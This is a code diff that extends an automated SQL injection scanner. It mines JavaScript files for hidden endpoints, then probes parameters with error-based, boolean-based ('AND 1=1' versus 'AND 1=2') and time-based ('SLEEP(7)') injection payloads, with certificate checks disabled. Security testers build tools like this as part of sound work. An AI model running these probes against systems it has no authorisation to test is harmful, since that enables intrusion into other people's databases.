@@ -243,9 +243,58 @@ _SQL_ERRORS = re.compile(
 )
 
 
+def _classify_params(params: dict) -> list[str]:
+    """Order param names by injection likelihood: numeric first, then string, then rest."""
+    def rank(name: str) -> int:
+        val = params[name][0] if params[name] else ""
+        if val.strip() and val.strip().lstrip("-").isdigit():
+            return 0  # numeric — most likely injectable
+        if val.strip():
+            return 1  # has a string value
+        return 2      # empty / blank
+
+    return sorted(params.keys(), key=rank)
+
+
+# Endpoint extraction patterns for JS bodies
+_JS_ENDPOINT_PATTERNS = [
+    re.compile(r"""XMLHttpRequest\(\)[\s\S]{0,80}?\.open\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""\.open\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""fetch\(\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""axios\.(?:get|post|put|delete|patch)\(\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""axios\(\s*\{[^}]*?url\s*:\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""\$\.ajax\(\s*\{[^}]*?url\s*:\s*['"]([^'"]+)['"]"""),
+    re.compile(r"""\$\.(?:get|post)\(\s*['"]([^'"]+)['"]"""),
+]
+
+
+def _extract_js_endpoints(js_content: str, base_url: str) -> list[str]:
+    """Pull endpoints referenced by AJAX/fetch/axios/jQuery calls in a JS file."""
+    from urllib.parse import urljoin
+
+    found: set[str] = set()
+    for pat in _JS_ENDPOINT_PATTERNS:
+        for ref in pat.findall(js_content):
+            ref = ref.strip()
+            if not ref or ref.startswith(("data:", "blob:", "javascript:", "mailto:", "#")):
+                continue
+            # Skip template literals we can't resolve (e.g. `/api/${id}`)
+            if "${" in ref or "{{" in ref:
+                continue
+            if ref.startswith(("http://", "https://", "/")) or "?" in ref:
+                found.add(urljoin(base_url, ref))
+    return list(found)
+
+
 async def _probe_sqli(url: str, cookie: str | None) -> list[dict]:
-    """Inject ' into each parameter and look for SQL errors."""
+    """
+    3-layer SQLi detection per parameter, params probed in priority order:
+      1. Error-based: inject ' and match DB error signatures
+      2. Boolean-based: AND 1=1 vs AND 1=2, flag when response sizes diverge
+      3. Time-based: AND SLEEP(7), flag when it stalls but SLEEP(0) baseline is fast
+    """
     import httpx
+    import time
 
     parsed = urlparse(url)
     params = parse_qs(parsed.query, keep_blank_values=True)
@@ -257,33 +306,83 @@ async def _probe_sqli(url: str, cookie: str | None) -> list[dict]:
     if cookie:
         headers["Cookie"] = cookie
 
-    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
-        for param_name in params:
-            # Build URL with ' injected into this param only
-            test_params = {k: v[0] for k, v in params.items()}
-            original_val = test_params[param_name]
-            test_params[param_name] = original_val + "'"
-            new_query = urlencode(test_params)
-            test_url = urlunparse(parsed._replace(query=new_query))
+    def build(param_name: str, payload: str) -> str:
+        test_params = {k: v[0] for k, v in params.items()}
+        test_params[param_name] = test_params[param_name] + payload
+        return urlunparse(parsed._replace(query=urlencode(test_params)))
 
+    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12) as client:
+        # Baseline response for the unmodified URL (boolean comparison)
+        try:
+            base_resp = await client.get(url, headers=headers)
+            base_len = len(base_resp.text)
+        except Exception as e:
+            logger.debug(f"SQLi baseline failed for {url}: {e}")
+            base_len = None
+
+        for param_name in _classify_params(params):
+            found_for_param = False
+
+            # ── Layer 1: error-based ──
             try:
+                test_url = build(param_name, "'")
                 resp = await client.get(test_url, headers=headers)
-                body = resp.text
-                if _SQL_ERRORS.search(body):
-                    # Extract the matched error snippet
-                    match = _SQL_ERRORS.search(body)
-                    snippet = body[max(0, match.start()-40):match.end()+80].strip()
+                m = _SQL_ERRORS.search(resp.text)
+                if m:
+                    snippet = resp.text[max(0, m.start() - 40):m.end() + 80].strip()
                     findings.append({
-                        "url": test_url,
-                        "original_url": url,
-                        "parameter": param_name,
-                        "payload": "'",
-                        "status_code": resp.status_code,
-                        "evidence": snippet[:300],
-                        "type": "sqli_error",
+                        "url": test_url, "original_url": url, "parameter": param_name,
+                        "payload": "'", "status_code": resp.status_code,
+                        "evidence": snippet[:300], "type": "sqli_error", "method": "error-based",
                     })
+                    found_for_param = True
             except Exception as e:
-                logger.debug(f"SQLi probe error for {test_url}: {e}")
+                logger.debug(f"SQLi error-probe failed for {param_name}: {e}")
+
+            # ── Layer 2: boolean-based ──
+            if not found_for_param and base_len is not None:
+                try:
+                    true_url = build(param_name, " AND 1=1-- -")
+                    false_url = build(param_name, " AND 1=2-- -")
+                    r_true = await client.get(true_url, headers=headers)
+                    r_false = await client.get(false_url, headers=headers)
+                    lt, lf = len(r_true.text), len(r_false.text)
+                    # TRUE close to baseline, FALSE clearly different → boolean injection
+                    if abs(lt - base_len) < 50 and abs(lt - lf) > max(60, base_len * 0.05):
+                        findings.append({
+                            "url": true_url, "original_url": url, "parameter": param_name,
+                            "payload": "AND 1=1 / AND 1=2", "status_code": r_true.status_code,
+                            "evidence": f"baseline={base_len}B  true(1=1)={lt}B  false(1=2)={lf}B",
+                            "type": "sqli_boolean", "method": "boolean-based",
+                        })
+                        found_for_param = True
+                except Exception as e:
+                    logger.debug(f"SQLi boolean-probe failed for {param_name}: {e}")
+
+            # ── Layer 3: time-based (expensive — only if nothing found yet) ──
+            if not found_for_param:
+                try:
+                    sleep_url = build(param_name, "/**/AND/**/SLEEP(7)-- -")
+                    t0 = time.monotonic()
+                    r_sleep = await client.get(sleep_url, headers=headers)
+                    elapsed = time.monotonic() - t0
+                    if elapsed > 6:
+                        # Confirm with SLEEP(0) — baseline must come back fast
+                        base_url2 = build(param_name, "/**/AND/**/SLEEP(0)-- -")
+                        t1 = time.monotonic()
+                        await client.get(base_url2, headers=headers)
+                        base_elapsed = time.monotonic() - t1
+                        if base_elapsed < 3:
+                            findings.append({
+                                "url": sleep_url, "original_url": url, "parameter": param_name,
+                                "payload": "AND SLEEP(7)", "status_code": r_sleep.status_code,
+                                "evidence": f"SLEEP(7)={elapsed:.1f}s  SLEEP(0)={base_elapsed:.1f}s",
+                                "type": "sqli_time", "method": "time-based",
+                            })
+                except httpx.TimeoutException:
+                    logger.debug(f"SQLi time-probe timed out for {param_name} (possible injection)")
+                except Exception as e:
+                    logger.debug(f"SQLi time-probe failed for {param_name}: {e}")
 
     return findings
 
@@ -310,15 +409,47 @@ async def run_sqli_probe_pipeline(req: PipelineRequest):
     except RuntimeError as e:
         return {"error": str(e)}
 
-    param_urls = list({r["url"] for r in param_results})
+    param_urls = {r["url"] for r in param_results}
+    crawl_param_count = len(param_urls)
 
     await ws_manager.broadcast("pipeline", {
         "phase": "katana", "event": "completed",
         "pipeline": "sqli",
         "total_urls": len(all_results),
-        "xss_candidates": len(param_urls),
-        "message": f"Found {len(all_results)} URLs — {len(param_urls)} with parameters",
+        "xss_candidates": crawl_param_count,
+        "message": f"Found {len(all_results)} URLs — {crawl_param_count} with parameters",
     })
+
+    cookie = opts.get("cookie", "") or None
+
+    # Phase 1b: mine .js files for endpoints the crawler never linked to
+    if opts.get("parse_js", True):
+        js_urls = [r["url"] for r in all_results if r["url"].split("?")[0].endswith(".js")]
+        if js_urls:
+            await ws_manager.broadcast("pipeline", {
+                "phase": "js_parse", "event": "started", "pipeline": "sqli",
+                "targets": len(js_urls),
+                "message": f"Parsing {len(js_urls)} JS files for hidden endpoints...",
+            })
+            js_endpoints: set[str] = set()
+            workers = int(opts.get("workers", 5))
+            for i in range(0, len(js_urls), workers):
+                chunk = js_urls[i:i + workers]
+                contents = await asyncio.gather(*[_fetch_js(u, cookie) for u in chunk])
+                for u, content in zip(chunk, contents):
+                    if not content:
+                        continue
+                    for ep in _extract_js_endpoints(content, u):
+                        if "?" in ep and parse_qs(urlparse(ep).query) and ep not in param_urls:
+                            js_endpoints.add(ep)
+            param_urls |= js_endpoints
+            await ws_manager.broadcast("pipeline", {
+                "phase": "js_parse", "event": "completed", "pipeline": "sqli",
+                "js_endpoints": len(js_endpoints),
+                "message": f"JS parsing added {len(js_endpoints)} new parameterized endpoint(s)",
+            })
+
+    param_urls = list(param_urls)
 
     if not param_urls:
         return {"status": "completed", "total_urls": len(all_results), "candidates": 0, "findings": 0}
@@ -331,7 +462,6 @@ async def run_sqli_probe_pipeline(req: PipelineRequest):
         "message": f"Probing {len(param_urls)} URLs for SQL errors...",
     })
 
-    cookie = opts.get("cookie", "") or None
     all_findings = []
     workers = int(opts.get("workers", 5))
 
